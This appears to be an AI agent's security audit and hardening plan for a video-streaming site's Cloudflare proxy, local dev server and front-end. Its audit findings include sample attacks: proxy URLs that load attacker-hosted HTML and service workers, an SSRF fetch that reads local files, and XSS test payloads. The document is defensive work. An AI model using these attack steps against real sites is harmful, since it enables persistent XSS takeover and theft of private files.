# Security hardening plan (2026-10-10)

Status: PLAN ONLY, nothing implemented. Read-only audit of the code at `e741ebf` (master, clean tree).
Live checks: 7 sequential GET/HEAD requests to https://tvzinhaonline.pages.dev (no payloads). No request to MGEB or any video host.
Secret values are never quoted here; they are referenced by file:line only.

## Summary

- **D2 is confirmed and worse than recorded.** `/api/stream` fetches any URL and copies *every* upstream header to our origin (`stream.js:176`), not only `Content-Type`. Besides plain XSS, this lets an attacker pass `Service-Worker-Allowed: /`, `Set-Cookie`, `Refresh` (redirect) and their own CSP through our domain. A one-click XSS can therefore register a service worker for the whole site and keep control of it for that visitor (persistent takeover).
- **New high: subtitle XSS in production.** The player renders subtitle cues as HTML (`engine.js:1230`, `escape: false`; Artplayer 5.1.7 then does `$subtitle.innerHTML = cue.text`). The local server strips tags from WebVTT (`local_server.py:1262-1272`), but `stream.js` has **no** WebVTT cleanup, so the bug cannot be seen locally and is live in production for any subtitle host (anime source).
- **New high (developer machine): the local server is a LAN/file gateway.** It listens on `0.0.0.0`, serves the whole project folder with directory listing (including `.git/` and git-ignored files such as `.env` or `.archives/history/` when present) and its proxy (CORS `*`) can be aimed at `http://127.0.0.1:8787/...` or LAN devices (router pages) by any website the developer visits while it runs. `file://` targets are only stopped by accident (a `TypeError` on `resp.status == None`).
- **Parity gaps** between `stream.js` and `local_server.py` (header copying, WebVTT cleanup, referer rules, HEAD handling, error bodies) and between `_middleware.js` and the local static server. The local copy masks production bugs (it hid the subtitle XSS).
- D4 (innerHTML), D5 (CORS), D6 (headers), D7 (SRI), D8 (error text), D9 (bind address) and D11 (quota) are confirmed with corrections below. D1 is sound (production returns 404 for blocked paths). D3 is confirmed and stays postponed; the plan recommends **not** proxying TMDB because it would turn every catalog request into a Function invocation (D11).
- The most effective single control is **signed proxy URLs** (HMAC): only URLs produced by our own `/api/resolve` (and playlists it signed) can be proxied. It closes the open proxy, the XSS-via-arbitrary-URL, the SSRF and most quota abuse in one general mechanism, with no host lists.

## Findings table

| ID | Title | Severity | Status vs backlog | Evidence |
|----|-------|----------|-------------------|----------|
| D1 | Internal paths public | (fixed) | Done, verified sound | `functions/_middleware.js:15-46`, `_routes.json`; prod `/tools/local_server.py` and `/%2Earchives/backlog.md` -> 404 |
| D2 | Open proxy, upstream type and **all upstream headers** reflected on our origin | Critical | Confirmed, scope larger than recorded | `functions/api/stream.js:73,117-121,176-186`; `tools/local_server.py:1194-1225,1276-1281` |
| N1 | Subtitle cues rendered as HTML; no WebVTT cleanup on the edge | High | New | `assets/js/player/engine.js:1230`; `stream.js` (no VTT branch) vs `local_server.py:1262-1272` |
| N2 | Local server: LAN exposure of project files, directory listing, SSRF bridge to localhost/LAN, latent `file://` read | High (dev machine) | New (D9 is one part) | `local_server.py:882-894,939-963,1213-1225,1318` |
| D4 | HTML sinks with external data (TMDB, scraped ge.globo feed, HLS manifests) | High | Confirmed | 57 HTML template sinks (41 more are clears); e.g. `movies.js:213,500,534`, `series.js:227,382,2046`, `sports.js:399,413-468`, `engine.js:2007` |
| D11 | Free quota (100k invocations/day) consumed per HLS segment; open proxy lets anyone burn it | High (availability) | Confirmed | `resolve.js:1014-1020,1095`; every segment URL rewritten at `stream.js:153-163` |
| N3 | Parity gaps stream.js / local_server.py and _middleware.js / local static server | Medium (test blind spot) | New | see N3 below |
| D5 | CORS `*` on `/api/resolve` and `/api/stream` | Medium | Confirmed | `resolve.js:84,964,1163,1179`; `stream.js:57,79,131,177,190`; `local_server.py:898` |
| D6 | No CSP / frame-ancestors / Permissions-Policy; Functions responses carry no security headers | Medium | Partly in place | `_headers` (cache rules only); Pages already adds `nosniff` + `Referrer-Policy` to static files, but not to `/api/*` (observed live) |
| D7 | No SRI on jsDelivr scripts | Medium | Confirmed | `index.html:1916-1917` |
| B11 | CDN scripts delay app start | Medium (perf) | Confirmed, location corrected | `index.html:1916-1917` are at the end of `<body>`, not in `<head>`, but as classic sync scripts they still hold back `main.js` |
| N4 | Third-party embed iframes without `sandbox` (top navigation, popups on click) | Medium | New | `movies.js:56-63`, `series.js:97-104`, `channels.js:738-747` |
| D8 | Raw error text and upstream error bodies returned | Low-Medium | Confirmed, wider | `stream.js:188`; `local_server.py:969,1304`; upstream non-2xx bodies passed through `stream.js:182` |
| D9 | Local server binds `0.0.0.0` | Medium | Confirmed | `local_server.py:1318` |
| N5 | Unbounded in-memory caches; `/api/resolve` amplifies traffic to MyAnimeList (WAF ban for everyone) | Low-Medium | New | `resolve.js:825,890`; `local_server.py:26,606,799,821` |
| N6 | Redirects followed without re-validation | Low | New | `stream.js:120`; urllib default redirect handler |
| N7 | Local server trusts the `Host` header (DNS rebinding), `/__dev/clear-cache` is a CORS GET | Low | New | `local_server.py:944-953,995-996,1232-1233` |
| N8 | Workflow actions pinned by tag; public repo history holds the TMDB key and old exports | Low | New (relates to D3) | `.github/workflows/update_matches.yml:12-20` |
| D3 | TMDB key hardcoded | Low (postponed) | Confirmed | `core/constants.js:7`, `resolve.js:8`, `local_server.py:23`, also `.archives/handovers/2026-10-06.md`, `.archives/scopes/refactor-analysis.md`, git history |

## Detailed findings (backlog items)

### D1. Path block (done) - sound

- Code: decodes once, lower-cases, folds `\` and `//`, blocks malformed escapes; `_routes.json` routes every path with `%` to the middleware. Dot segments are resolved by URL parsing first. `tools/test_path_block.mjs` covers 33 cases.
- Live: `/tools/local_server.py` and `/%2Earchives/backlog.md` -> 404 `text/plain`. `/functions/api/resolve.js` and `/_routes.json` return the SPA home page (Pages never publishes them), not the file.
- T13 can be closed by running `python tools/check_deployment.py https://tvzinhaonline.pages.dev` (it already checks 25 blocked variants for leaks and that `data/*.json`/assets load). Not run here because it also calls `/api/resolve`/`/api/stream`, which reach the video hosts another agent is measuring.
- Gap: the local static server has no equivalent block (see N2/N3).

### D2. Open proxy -> XSS and header injection on our origin (Critical)

Evidence: `stream.js:73` takes `url` verbatim; `:117` fetches it (any scheme `fetch` accepts, redirects followed); `:176` `new Headers(upstreamResponse.headers)` copies **all** upstream headers, `:182` returns the body with upstream status.

Exploits (attacker hosts the payload on any HTTPS server):
- `https://tvzinhaonline.pages.dev/api/stream?url=https://attacker.example/p.html` -> served as `text/html` on our origin (no CSP, no `nosniff` on Function responses, confirmed live). Script reads/poisons `localStorage` (favorites, progress, TMDB caches, which are rendered with innerHTML -> persistent XSS) and can phish under our domain.
- Persistence: from that page, `navigator.serviceWorker.register('/api/stream?url=https://attacker.example/sw.js', {scope: '/'})`; the upstream answers `Content-Type: application/javascript` and `Service-Worker-Allowed: /`, both copied through. The worker then controls every future visit of that browser to the site.
- `Refresh: 0;url=...`, `Set-Cookie`, `Link`, upstream CSP are passed through as well (open redirect and cookie tossing on our host).
- Abuse: free anonymous bandwidth proxy for any content (quota exhaustion, abuse reports against the Cloudflare account). `referer`/`origin` params let anyone spoof those headers upstream.
- `?.m3u8` suffix trick only yields a playlist content type (harmless), noted for tests.

Proposed fix (general, both `stream.js` and `local_server.py`):
1. **Response header allowlist** (what local already does): build headers from scratch: mapped `Content-Type`, `Content-Length`, `Content-Range`, `Accept-Ranges`, plus our own. Never copy upstream headers wholesale.
2. **Content type mapping, not refusal**: playlist -> `application/vnd.apple.mpegurl` (already), WebVTT -> `text/vtt; charset=utf-8`, upstream `video/*`, `audio/*`, `application/mp4`, `application/octet-stream`, `binary/octet-stream`, `video/mp2t` kept; **anything else** (html, javascript, svg, xml, css, json, text/plain, image disguises) -> `application/octet-stream`. Segments disguised as `.jpeg`/`text/html` keep playing because hls.js ignores the type.
3. **Always add**: `X-Content-Type-Options: nosniff`, `Content-Security-Policy: sandbox; default-src 'none'`, `Cross-Origin-Resource-Policy: same-origin`, `Cache-Control` as today. (No `Content-Disposition`: untested effect on iPhone native HLS; sandbox CSP already neutralizes rendering.)
4. **Scheme**: only `http:`/`https:` (rejects `file:`, `ftp:`, `data:`, `javascript:`). Whether to drop plain `http:` is a decision (Q2): the proxy also bridges http hosts to our https page.
5. **Limits**: upstream response-header timeout ~15 s (AbortController cleared once headers arrive so long MP4 bodies keep streaming); buffered bodies (playlist, VTT) capped at 5 MB, else 502; streamed segment bodies not capped (Range-based playback).
6. **Generic errors** (D8) and replace upstream non-2xx bodies with a short text, keeping the status code (hls.js retry logic uses it).
7. **Redirects**: `redirect: "manual"` loop (max 5 hops) re-validating scheme each hop; resolve relative playlist lines against the final URL (`upstreamResponse.url`), which also fixes a latent bug at `stream.js:144`.
8. **Signed URLs** (Phase 4, the real closure, see "Signed proxy URLs" below). The origin check proposed in the backlog is weak by nature: `<video>`, `<track>` and same-origin hls.js requests send no `Origin`, `curl` sends nothing, so it can only stop other websites' `fetch`. Keep it only as part of D5 (drop CORS), rely on signatures for abuse.

Must keep working: m3u8 rewriting (master, media, `#EXT-X-KEY`/`#EXT-X-MAP` URIs), MP4 `Range`/206 + `Content-Range`, HEAD, WebVTT cleanup, anime (zoko) and movie/series (MGEB) sources, phone over LAN IP. Live channels do **not** use the proxy (`data/canais.json` has no `/api/stream`, all https) so they are unaffected, but are part of the regression run anyway.

Risk: Medium. Main unknown: Firefox `<video>` playback of a non-direct MP4 through the proxy when the upstream type is odd (mitigated by keeping `video/*`/octet-stream types). Verified per phase in Edge and Firefox.

### D3. TMDB key (postponed, low)

Confirmed at `core/constants.js:7` (used client-side by `movies.js:96`, `series.js:267`), `resolve.js:8`, `local_server.py:23`, plus two `.archives` docs and the public git history. Because the browser calls TMDB directly, the key is public by design; a `/api/tmdb` proxy (T17) would add one Function invocation per catalog/detail request and compete with video for the 100k/day quota. Recommendation: keep it client-side, do not proxy; optionally rotate later and read the server copy from `context.env` / an environment variable; drop it from the `.archives` docs when they are next edited.

### D4. HTML sinks with external data (High)

- Count: 57 `innerHTML = \`...\`` / `+=` / `insertAdjacentHTML` template sinks (`series.js` 43 total uses, `movies.js` 30, `channels.js` 18, `engine.js` 10, `sports.js` 8), 41 more are plain clears. No escape helper exists.
- Untrusted sources: TMDB titles/overviews/genres/names (community-edited), the match feed scraped from ge.globo by the workflow (`sports.js:399,413-468`: names, championship, broadcaster list into text, `alt=`, `data-` attributes and `src=`), HLS audio track names from host manifests into Artplayer `html` (`engine.js:2007`), and the same data re-rendered from `localStorage` caches.
- Contexts: element text, quoted attributes (`alt="${title}"`), URLs (`src="${crestUrl}"`), plus inline `onerror="..."` handlers (10 in JS templates) that also block a strict CSP.
- No URL/hash/query input reaches a sink (no reflected DOM XSS found); `channels.js:882` opens URLs from our own `canais.json` only.
- Fix: `assets/js/core/html.js` with `escapeHtml()` (text and quoted attributes) and `safeUrl()` (allow `https:`, `http:`, relative; else fallback image); apply to every interpolation of non-constant data; replace inline `onerror` with `data-fallback="..."` and one capture-phase `error` listener on `document`; use `textContent` where the whole node is text. Add a lint step to `tools/check_js.py` that flags `${...}` inside HTML templates not wrapped by `escapeHtml`/`safeUrl` (allowlist for icon constants).
- Risk: Medium (wide diff, purely mechanical). Visible regressions would be double escaping (`&amp;` shown) or broken fallbacks; covered by T15 and the UI suites.

### D5. CORS `*` (Medium)

All app calls to `/api/resolve` and `/api/stream` are same-origin (production, previews `feat-*.tvzinhaonline.pages.dev`, `localhost:8787`, LAN IP:8787), so CORS headers are not needed. Fix: remove `Access-Control-Allow-*` and the OPTIONS handlers (or answer only an allowlist of our origins) in both implementations. Risk: Low; only an unknown external consumer would break (Q8).

### D6. Security headers (Medium, partly in place)

- Live: static responses already carry `x-content-type-options: nosniff` and `referrer-policy: strict-origin-when-cross-origin` (Pages defaults). No CSP, no `frame-ancestors`, no `Permissions-Policy`. `/api/*` responses carry none of these, and `_headers` does **not** apply to Function responses, so Function headers must be set in code.
- CSP needs (from the code): inline bootstrap script `index.html:20-118` (move to `assets/js/boot.js` or hash it), inline `onerror` handlers (removed in D4), inline `style=` attributes (keep `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`), Google Fonts (`font-src https://fonts.gstatic.com`), hls.js workers (`worker-src 'self' blob:`), MSE (`media-src 'self' blob: https:`), direct MP4 and live channel hosts, TMDB/AniSkip/SkipDB/TheIntroDB/raw.githubusercontent APIs (`connect-src 'self' https:`), many embed hosts (`frame-src https:`), images from TMDB, s.sde.globo.com and others (`img-src 'self' data: blob: https:`), plus `object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'`. The XSS value comes from `script-src 'self'` (+ jsDelivr only if not self-hosted; a jsDelivr host allowance can load any npm package, another reason for Q3).
- Also `Permissions-Policy` limited to what the player uses (fullscreen, picture-in-picture, autoplay, screen-wake-lock).
- Rollout: `Content-Security-Policy-Report-Only` on a preview first, then enforce. Risk: Medium-High (a missed source breaks a player); T16 covers it.

### D7 + B11. SRI and blocking CDN scripts (Medium)

- SRI values computed today from jsDelivr (sha384, to be re-checked at implementation): hls.js 1.5.8 `sha384-xLhS5rbIdhv65H3GLX+caQgMSiEK/Hkw8Z6HITolgRxvXs0omcbeYD639tkJ2Wu6`, Artplayer 5.1.7 `sha384-LjKKmyj09xPIr/srcAiLFrPjAMi28Sz1pQNHGLknpHAebKxQXQb/UtuCeMBPbl2P` (public integrity hashes, not secrets). Need `crossorigin="anonymous"`.
- B11 correction: the tags are at `index.html:1916-1917`, end of `<body>`. They do not block HTML parsing of the page, but `main.js` (a module, deferred) runs only after them, so a slow CDN still delays the whole app. `defer` alone does not fix that (document order is kept).
- Recommended: self-host both files under `assets/vendor/` (no third-party script at all, SRI unnecessary, simpler CSP) and load them on demand from `engine.js` (`loadScriptOnce()` before the first player opens; prefetch on idle). Alternative: keep jsDelivr with SRI and the same lazy loader. Risk: Low-Medium (all players and live TV depend on the globals `Hls`/`Artplayer`).

### D8. Error details (Low-Medium)

`stream.js:188` returns `err.message`; local returns `str(e)` (`local_server.py:969,1304`), which leaks absolute paths (WinError) and acts as a file-existence oracle for `file://`. Upstream error pages are passed through as bodies. Fix in Phase 1 (generic JSON `{error:"upstream_failed"}` / `{error:"bad_request"}`; details only to the server log).

### D9. Local server on 0.0.0.0 (Medium) - see N2 for the full fix

### D11. Cloudflare quota (High availability)

- Each proxied HLS request is one invocation: master + media playlist + every segment (+ VTT). At 6 s segments that is ~10 invocations per minute of playback: ~240 for a 24-min episode, ~1,200 for a 2-hour movie, so 100k/day is roughly 80 movies or 400 episodes per day before `/api/*` starts failing (static site keeps working because the middleware runs only on blocked paths). An open proxy lets any third party burn this.
- `/api/resolve` caching does not reduce invocations (a Function still runs); it only saves upstream work. Already `Cache-Control: public, max-age=1800` + client cache in `engine.js:743-761`.
- Per-IP limits in code are per-isolate and weak; WAF rate-limit rules are not available on a `*.pages.dev` hostname. Signed URLs remove third-party abuse instead.
- Real saving (general, no host list): **proxy the playlist, let segments go direct when the segment host allows it**. `resolve.js` already fetches the first segment while probing (`probeFirstSegment`); record whether that response has `Access-Control-Allow-Origin` (`*` or echo) and whether the referer it needs is our own site/none (browser sends `https://tvzinhaonline.pages.dev/` under `strict-origin-when-cross-origin`). If both hold, mark the source `segments: "direct"` (a signed flag) and the playlist rewrite leaves segment lines as absolute upstream URLs. Fallback: the proxied variant stays in `fallback_sources`. Live channels are already direct.
- Alternative: Workers Paid ($5/month, 10M requests) removes the constraint (Q7).

## New findings

### N1. Subtitle XSS (High)

`engine.js:1227-1239` passes `escape: false`; Artplayer 5.1.7 `subtitle.update()` then assigns `$subtitle.innerHTML = activeCue.text` (raw cue text). A cue such as `<img src=x onerror=...>` in a VTT file from the anime host executes on our origin in production, because `stream.js` forwards VTT untouched. Locally `local_server.py:1268` strips tags, so local tests never show it.
Fix: `escape: true` (Artplayer escapes and splits lines into `art-subtitle-line` divs) and port the WebVTT cleanup to `stream.js` (parity). Defense in depth: `onVttLoad` hook stripping tags client-side. Effect: italics/bold markup is shown as plain text (already the case locally). Risk: Low; check line breaks and the subtitle switch path `engine.js:2096`.

### N2. Local server exposure (High on the developer machine)

- `ThreadedHTTPServer(("0.0.0.0", 8787))` (`:1318`) + `SimpleHTTPRequestHandler` rooted at the project (`:893-894`, `:931`, `:963`): anyone on the same Wi-Fi can list and download the folder, including `.git/`, `.archives/`, `tools/` and git-ignored local files (`.env`, `.archives/history/` chat exports, which `.gitignore` says hold API keys, `scratch/`).
- Proxy as bridge: any web page the developer opens while the server runs can `fetch('http://127.0.0.1:8787/api/stream?url=http://127.0.0.1:8787/.archives/history/...')` or `...url=http://192.168.0.1/` and read the answer (CORS `*`). Recent Chromium asks a local-network permission for this; Firefox does not. Do not rely on it.
- `file://`: urllib opens `file:` and `ftp:` URLs. Today the response status is `None`, and `send_response(None)` raises `TypeError` (verified offline with Python 3.15), so contents are not returned, only an existence oracle through the error text. One harmless-looking refactor (`resp.status or 200`) would turn it into local file disclosure.
- Fix: bind `127.0.0.1` by default, `--lan` flag to bind `0.0.0.0` for phone tests (print the LAN URL and a warning), `--port` option; mirror the `_middleware.js` block list in the static handler and disable directory listing; scheme allowlist (Phase 1); refuse proxy targets that are loopback/private/link-local (literal IPs and resolved names), plus the edge equivalent for literal IPs (parity); `Host` header allowlist (N7). Risk: Low; phone tests need `--lan` (document in the handover and CLAUDE.md context line).

### N3. Parity gaps (Medium: they hide production bugs)

| Behavior | stream.js | local_server.py |
|---|---|---|
| Upstream headers | all copied (`:176`) | allowlist of 3 (`:1278-1280`) |
| WebVTT cleanup | none | strips tags (`:1262-1272`) |
| Auto referer for googlevideo/blogger | yes (`:95-96`) | missing |
| `origin` query param | honored (`:86,108`) | ignored; Origin only for zoko (`:1216-1217`) |
| HEAD | upstream GET, body dropped | adds `Range: bytes=0-0` (`:1221-1222`) |
| Playlist rewrite condition | `upstream.ok` | `status == 200` |
| Upstream error | upstream status + body | status + "Upstream HTTP Error N" |
| Proxy base | request origin | `Host` header (`:1232-1233`) |
| Static path block | `_middleware.js` | none |

Fix: converge both on the hardened behavior in each phase and add a shared fixture suite (T18) that runs the same cases against both implementations offline.

### N4. Third-party embed iframes without sandbox (Medium)

Iframes for embed servers and channel contingency have no `sandbox` (`movies.js:56-63`, `series.js:97-104`, `channels.js:738-747`). They are cross-origin (cannot read our DOM), but on a click they can navigate the top page or open popups; the head guard only overrides *our* `window.open` and asks on `beforeunload`. Fix candidate: `sandbox="allow-scripts allow-same-origin allow-forms allow-presentation"` (no `allow-popups`, no `allow-top-navigation`) plus `allow="fullscreen; autoplay; encrypted-media; picture-in-picture"`. Many embed hosts detect sandboxing and refuse to play, so this needs a per-server test on a preview; the decision is the user's (Q5). Risk: High for availability of iframe servers.

### N5. Unbounded caches and MAL amplification (Low-Medium)

`malMemoryCache`/`entrySpanCache` (`resolve.js:825,890`) and four local dicts never evict; keys come from request parameters. A flood of `/api/resolve?type=anime&title=<random>` grows isolate memory and sends MyAnimeList prefix searches from Cloudflare egress, which is exactly what triggers the MAL WAF captcha (~150 requests) for every user. Fix: cap each cache (e.g. 500 entries, drop oldest), and a small per-isolate cap on *new* MAL lookups per client IP per minute (cache hits unaffected). Risk: Low.

### N6. Redirects (Low)

`redirect: "follow"` (`stream.js:120`) and urllib's handler re-target without our checks. Workers cannot reach private networks, so on the edge this mainly matters for scheme checks and relative-URL resolution; locally it matters for SSRF. Covered by the manual redirect loop in Phase 1.

### N7. Local Host header and dev endpoint (Low)

Proxy URLs are built from the `Host` header (`local_server.py:995-996,1232-1233`), and no `Host` check exists, which enables DNS rebinding against the dev server. `/__dev/clear-cache` (`:944-953`) is a CORS-enabled GET any site can trigger. Fix: accept only `localhost`, `127.0.0.1`, `[::1]` and the detected LAN IP (with `--lan`); restrict clear-cache to loopback.

### N8. Workflow and repository (Low)

`update_matches.yml` has `contents: write` (needed for the data branch) and actions pinned by tag (`checkout@v4`, `setup-python@v5`); no secrets used. Pin both to commit SHAs. The repository is public (the workflow and the raw feed URL rely on it), so the git history exposes the TMDB key and any old `docs/` chat exports that D1 now hides on the site; the user should check `git log --all -- docs/` and decide whether old keys must be revoked (the other keys mentioned in D3 notes). The feed it writes is rendered with innerHTML (D4).

## Signed proxy URLs (design used by Phase 4)

- Secret `PROXY_SIGNING_KEY`: Cloudflare Pages environment variable (Production and Preview, encrypted); locally an environment variable or a random value generated at start (resolve and stream live in the same process).
- `resolve.js`/`handle_resolve` emit `/api/stream?url=...&referer=...&sig=<base64url HMAC-SHA256(key, url|referer|origin)>`; `stream.js`/`handle_stream` verify with Web Crypto / `hmac.compare_digest` and answer 403 otherwise. Playlist rewrites sign every rewritten line (trust chains from a signed playlist). No expiry needed (upstream URLs carry their own tokens); optional `exp` later.
- Browser HTTP cache: `/api/resolve` answers are cached up to 30 min (`resolve.js:1164`); add a `sv=2` parameter to resolve requests in `engine.js` in the same release so no browser replays unsigned URLs.
- Missing key on the edge: fail closed (403) with a clear server log line; `check_deployment.py` catches it.

## Phased implementation plan

Rules for every phase: both implementations changed together (T18), cache-busting bump when frontend modules change (`python tools/bump_version.py`), `python tools/check_js.py` + `node --check` on changed files (T19), hard stop with numbers at the end of each phase. Browser suites only when the phase touches the player, and the risk they cover is stated first. Preview deploys need the user to ask for the branch.

### Phase 0. Test harness and baseline (no behavior change)

- `tools/test_stream_proxy.mjs`: imports `functions/api/stream.js` with a stubbed global `fetch` (no network) and runs shared fixtures from `tools/fixtures/stream_cases.json`.
- `tools/test_stream_proxy.py`: same fixtures against `DevAPIHandler.handle_stream` with `urlopen` monkeypatched (no server, no port).
- Cases: playlist rewrite (relative, absolute, `URI=` tags), Range 206 passthrough, HEAD, VTT, upstream 404/500, HTML/JS/SVG upstream types, `Set-Cookie`/`Service-Worker-Allowed`/`Refresh` upstream headers, `file:`/`ftp:`/`javascript:` targets, oversized playlist, CR/LF in `referer`.
- Baseline: record which negatives fail today (expected: most). T13: run `python tools/check_deployment.py https://tvzinhaonline.pages.dev` once the host measurement by the other agent is over.
- Verification: both suites run offline; report pass/fail counts per case.

### Phase 1. Proxy response hardening (D2 core, D8, N3 parity, N6)

- Both implementations: scheme allowlist, header allowlist, content type mapping, `nosniff` + `CSP sandbox` + CORP, generic errors and bodies, buffered-body cap 5 MB, header timeout 15 s, manual redirects (max 5) with relative resolution against the final URL, WebVTT cleanup on the edge, unified referer rules and HEAD behavior.
- Verification: Phase 0 suites all green in JS and Python (same results = T18). T14 positives on a preview: `node tools/player_benchmark.mjs --browser=edge` and `--browser=firefox` with movies, series and anime (TTFF vs C2 baseline), one MP4-through-proxy source in Firefox, HEAD and a seek (206). Live channels opened once (not proxied, sanity). `python tools/check_deployment.py <preview>`.
- Risk: Medium (Firefox MP4 types, playlist edge cases).

### Phase 2. Local server exposure (D9, N2, N7)

- Default bind `127.0.0.1`, `--lan` and `--port` flags, `Host` allowlist, static block list identical to `_middleware.js`, no directory listing, private/loopback target refusal, clear-cache loopback only.
- Verification: offline tests extended (Python) for blocked static paths using the same list as `test_path_block.mjs`; start on a spare port (`--port 8799`, never 8787 while another agent uses it) and confirm `http://<LAN-IP>:8799/` is refused without `--lan` and works with it; phone test of one anime and one movie over LAN with `--lan`.
- Risk: Low.

### Phase 3. Subtitle XSS (N1)

- `escape: true` in `engine.js`, optional `onVttLoad` cleanup, cache-busting bump.
- Verification: fixture VTT with an `<img onerror>` cue renders as text (unit case in Phase 0 suite for server cleanup; browser case in `tools/player_ui_check.mjs` with a stubbed subtitle). Manual: FMA:B (pt-BR default, switch to English and off), one title with English only; Edge and Firefox; line breaks preserved.
- Risk: Low.

### Phase 4. Signed proxy URLs + CORS removal (D2 closure, D5, D11 abuse)

- HMAC signing in `resolve.js`/`handle_resolve`, verification and re-signing in `stream.js`/`handle_stream`, `sv=2` on resolve requests, remove CORS headers and OPTIONS from both endpoints (or allowlist per Q8). Needs `PROXY_SIGNING_KEY` set in Cloudflare (user action).
- Verification: suites: unsigned -> 403, tampered `url`/`referer` -> 403, signed -> 200, rewritten lines carry valid signatures, CORS headers absent. T14 negatives on preview (arbitrary HTML URL -> 403, unsigned URL -> 403, foreign `Origin` gets no CORS). Positives: benchmark Edge + Firefox (movies, series, anime), skip-segment titles, phone over LAN. `check_deployment.py` (its stream check uses the URL from resolve, so it keeps working).
- Risk: Medium (any client path that builds proxy URLs itself would break; none found in `assets/js` or `tools/`).

### Phase 5. Output escaping (D4)

- `core/html.js` (`escapeHtml`, `safeUrl`), apply to all sinks, replace inline `onerror`, lint in `check_js.py`, cache-busting bump.
- Verification: T15: a browser check that intercepts TMDB, the match feed and a manifest audio-track name with `"><img src=x onerror=window.__xss=1>` (and a `javascript:` image URL) and asserts `window.__xss` stays undefined across catalog, hero carousel, details, episode list, continue watching, search, sports cards, player header and audio menu; existing suites `player_ui_check.mjs`, `player_touch_check.mjs`, `episode_entry_check.mjs` in Edge and Firefox; visual spot check of titles with `&` and accents.
- Risk: Medium (wide diff).

### Phase 6. Headers, CSP, SRI, script loading (D6, D7, B11)

- Move the inline bootstrap to `assets/js/boot.js`, self-host (or SRI) hls.js/Artplayer per Q3, lazy-load them from `engine.js`, add `_headers` rules for `/*` (CSP Report-Only first, `frame-ancestors 'none'`, `Permissions-Policy`), and security headers in Function responses (`nosniff` on resolve, sandbox already on stream).
- Verification: T16 on preview: zero CSP violations in the console in Edge and Firefox while opening live TV (direct and iframe), a movie, a series episode with subtitles, an anime, an iframe server, sports tab, TMDB images; SRI hash check; time-to-interactive with the CDN blocked (DevTools request blocking) shows the catalog still loads. Then switch Report-Only to enforcing and repeat.
- Risk: Medium-High (a missed source breaks a feature); Report-Only step contains it.

### Phase 7. Quota and resolve load (D11, N5)

- Measure first: invocations per minute of playback per title type (count `/api/*` requests in the benchmark). Then direct segments when the probe shows CORS and own/no referer, caps on caches, per-IP cap on new MAL lookups.
- Verification: invocations per minute before/after for 3 movies, 3 series, 3 anime; TTFF unchanged or better (Edge + Firefox); fallback to the proxied variant when a direct segment fails (simulate with request blocking).
- Risk: Medium (host CORS can vary per CDN edge; keep the proxied fallback).

### Phase 8 (optional, after Q5). Iframe sandbox (N4)

- Per-server test on a preview of the sandbox attribute; keep it on servers that play, document the others.
- Verification: each iframe server and contingency channel opens and plays; top navigation from inside the iframe blocked (manual click on ad overlays).

### Not scheduled. D3 (postponed by the user), N8 SHA pinning (5-minute change, can join any phase on request).

## Open questions for the user (with recommendations)

1. **Signed proxy URLs (Phase 4)** need a secret created in the Cloudflare Pages settings (Production and Preview). Recommendation: yes; it is the general fix for D2, D5, D11 abuse and SSRF.
2. **Plain `http:` upstreams**: allow them through the proxy or require https? Recommendation: allow `http:`/`https:` only, with signatures; measure in Phase 0/1 how many sources are http before deciding to drop them.
3. **hls.js and Artplayer**: self-host under `assets/vendor/` (recommended: no third-party script, simpler CSP, solves B11 with a lazy loader) or keep jsDelivr with SRI + lazy loader?
4. **D3 / T17**: keep the TMDB key client-side and drop the `/api/tmdb` idea (recommended; proxying multiplies invocations), with optional rotation later?
5. **Iframe sandbox (N4)**: test it per server even though some embed hosts may stop working? Recommendation: test on a preview and decide per server; leave it last.
6. **Subtitles with `escape: true`**: italics/bold tags show as plain text (already so locally). Recommendation: accept.
7. **Quota (D11)**: implement "segments direct when the host allows CORS" (recommended, after measuring), or move to Workers Paid ($5/month), or accept the limit?
8. **CORS**: remove it entirely from `/api/*` (recommended; all our calls are same-origin) unless another site or app of yours calls these endpoints.
9. **Order**: Phases 1-3 are small and remove the critical/high items; OK to start there, with Phase 0 first? Recommendation: yes.
10. **Public history (N8)**: check whether old `docs/` exports in the public git history contain other keys that should be revoked now. Recommendation: yes, quick check by the user or an agent with git read access.

## User decisions (2026-10-10)

Rule given by the user: nothing may change how the site works for viewers.

1. Signed proxy URLs: yes. The agent gives step-by-step instructions to create `PROXY_SIGNING_KEY` in the Cloudflare dashboard when Phase 4 starts.
2. `http:` upstreams: keep accepting them (with signatures).
3. hls.js and Artplayer: self-host the same versions under `assets/vendor/`, lazy-loaded.
4. D3: keep the TMDB key client-side; no `/api/tmdb`. Rotate only if the key gets blocked.
5. Iframe sandbox: **no** (Phase 8 dropped): it could break embed servers.
6. Subtitles: instead of `escape: true`, sanitize cues to an allowlist of `<i>`, `<b>`, `<u>` (everything else stripped or escaped), so formatting looks the same and scripts cannot run. Same cleanup in `stream.js` and `local_server.py`.
7. Quota (D11): **nothing now** (few users). Future item: per-IP request limits and DDoS protection. Phase 7 postponed.
8. CORS: remove from `/api/*` (no other site or app uses these endpoints).
9. Order: MGEB Phase 1 -> security Phases 0, 1, 3 -> MGEB Phase 2 (P4) -> security Phase 2 and Phases 4-6.
10. Old `docs/` exports in history: no check (the user says they hold nothing important).

## Adjustments after the cast button (2026-10-10)

- `/api/stream` keeps CORS: TV receivers and Web Video Caster fetch the proxied playlist and segments from another origin. CORS is removed from `/api/resolve` only (Phase 4).
- Phase 1 maps media types instead of always answering `application/octet-stream`: playlist `application/vnd.apple.mpegurl`, MPEG-TS (sync byte 0x47) `video/mp2t`, MP4 `video/mp4`, WebVTT `text/vtt`; anything else (HTML, JavaScript, SVG, images used as disguises) becomes `application/octet-stream`. Receivers need the real types.
- Signed addresses (Phase 4) stay valid for at least 24 h, so a cast movie is not cut.

## Phase 0 result (2026-10-12, not committed)

- `tools/fixtures/stream_cases.json` (21 cases), `tools/test_stream_proxy.mjs` (stream.js with a fake `fetch`), `tools/test_stream_proxy.py` (local_server.py through `do_GET`/`do_HEAD` with a fake `urlopen`, no socket; runs the Node side and judges both with the same rules). No network.
- Baseline: positives 5/5 in production and 5/5 local (playlist rewrite, master + `#EXT-X-KEY`, MP4 Range 206, HEAD, missing url). Negatives still open: production 0/16, local 3/16 (local already strips VTT tags and replaces upstream 404/500 bodies).
